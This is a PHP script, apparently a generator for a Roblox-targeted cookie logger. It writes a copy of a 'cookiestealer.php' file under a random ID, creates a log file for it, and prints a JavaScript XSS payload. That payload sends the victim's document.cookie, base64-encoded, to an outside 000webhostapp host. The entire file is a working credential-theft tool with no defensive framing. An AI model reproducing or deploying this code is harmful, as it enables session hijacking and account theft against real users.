<?php
$id = $randomNumber = rand(15,9285275);
$id2 = "document.location='https://rbxmarketip.000webhostapp.com/$id.php?c='+encodeURIComponent(btoa(document.cookie));";
$id3 = "https://rbxmarketip.000webhostapp.com/$id.txt";
$code = file_get_contents('./cookiestealer.php', true);
$myfile = fopen("$id.php", "w") or die("Unable to open file!");
$txt = "$code";
fwrite($myfile, $txt);
$myfile2 = fopen("$id.txt", "w") or die("Unable to open file!");
$txt2 = "";
fwrite($myfile2, $txt2);
?>
<!DOCTYPE html>
<html>
  <head>
    <title>Your link has been generated!</title>
  </head>
  <body>
    <p>This is your cookie logger link: <?=$id2?></p>
    <p>This is your cookie logger log: <?=$id3?></p>
    <p>This is your cookie logger id: <?=$id?></p>
    <p> this is your XSS link: &lt;script type="text/javascript"&gt;&lt;script type="text/javascript"&gt; document.location='https://rbxmarketip.000webhostapp.com/<?=$id?>.php?c='+encodeURIComponent(btoa(document.cookie)); &lt;/script&gt;</p>
  </body>
</html>